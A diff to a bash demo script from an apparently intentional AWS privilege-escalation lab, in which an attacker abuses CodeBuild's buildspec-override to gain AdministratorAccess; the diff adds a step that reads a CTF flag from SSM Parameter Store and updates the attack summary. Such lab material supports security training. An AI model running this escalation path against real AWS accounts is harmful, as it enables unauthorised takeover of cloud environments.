@@ -280,12 +280,14 @@ echo -e "${YELLOW}Waiting additional 15 seconds for IAM policy propagation...${N
 sleep 15
 echo -e "${GREEN}✓ Policy should be propagated${NC}\n"
 
-# [OBSERVATION] Step 10: Verify admin access
+# [EXPLOIT] Step 10: Verify admin access
+# Restore helpful permissions first — the deny policy overrides AdministratorAccess otherwise
+restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
 echo -e "${YELLOW}Step 10: Verifying administrator access${NC}"
-use_readonly_creds
+use_starting_creds
 echo "Attempting to list IAM users..."
 
-show_cmd "ReadOnly" "aws iam list-users --max-items 3 --output table"
+show_attack_cmd "Attacker (now admin)" "aws iam list-users --max-items 3 --output table"
 if aws iam list-users --max-items 3 --output table; then
     echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
     echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
@@ -297,12 +299,29 @@ else
 fi
 echo ""
 
+# [EXPLOIT] Step 11: Capture the CTF flag
+# The starting user now has AdministratorAccess attached, which grants ssm:GetParameter
+# implicitly. Use those credentials to read the scenario flag from SSM Parameter Store.
+use_starting_creds
+echo -e "${YELLOW}Step 11: Capturing CTF flag from SSM Parameter Store${NC}"
+FLAG_PARAM_NAME="/pathfinding-labs/flags/codebuild-002-to-admin"
+show_attack_cmd "Attacker (now admin)" "aws ssm get-parameter --name $FLAG_PARAM_NAME --query 'Parameter.Value' --output text"
+FLAG_VALUE=$(aws ssm get-parameter --name "$FLAG_PARAM_NAME" --query 'Parameter.Value' --output text 2>/dev/null)
+
+if [ -n "$FLAG_VALUE" ] && [ "$FLAG_VALUE" != "None" ]; then
+    echo -e "${GREEN}✓ Flag captured: ${FLAG_VALUE}${NC}"
+else
+    echo -e "${RED}✗ Failed to read flag from $FLAG_PARAM_NAME${NC}"
+    exit 1
+fi
+echo ""
+
 # Summary
 # Restore helpful permissions for manual exploration
 restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
 
 echo -e "\n${GREEN}========================================${NC}"
-echo -e "${GREEN}✅ PRIVILEGE ESCALATION SUCCESSFUL!${NC}"
+echo -e "${GREEN}✅ CTF FLAG CAPTURED!${NC}"
 echo -e "${GREEN}========================================${NC}"
 echo -e "\n${YELLOW}Attack Summary:${NC}"
 echo "1. Started as: $STARTING_USER (with codebuild:StartBuild)"
@@ -313,12 +332,14 @@ echo "5. Started build with --buildspec-override parameter"
 echo "6. Buildspec executed with admin role's permissions"
 echo "7. Successfully attached AdministratorAccess policy to $STARTING_USER"
 echo "8. Achieved: Administrator Access"
+echo "9. Captured CTF flag from SSM Parameter Store: $FLAG_VALUE"
 
 echo -e "\n${YELLOW}Attack Path:${NC}"
 echo -e "  $STARTING_USER → (codebuild:StartBuild with buildspec-override)"
 echo -e "  → $EXISTING_PROJECT with $PROJECT_ROLE"
 echo -e "  → Buildspec executes with admin permissions"
 echo -e "  → Attach AdministratorAccess to $STARTING_USER → Admin"
+echo -e "  → (ssm:GetParameter) → CTF Flag"
 
 if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
     echo -e "\n${YELLOW}Attack Commands:${NC}"
